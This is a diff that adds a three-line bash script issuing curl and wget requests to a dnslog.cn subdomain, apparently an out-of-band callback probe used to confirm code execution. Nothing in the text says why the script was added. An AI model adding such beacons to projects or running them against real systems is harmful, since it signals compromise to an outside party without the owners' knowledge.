@@ -1,0 +1,3 @@
+#!/bin/bash 
+curl tt.rtv0wm.dnslog.cn
+wget tt.rtv0wm.dnslog.cn
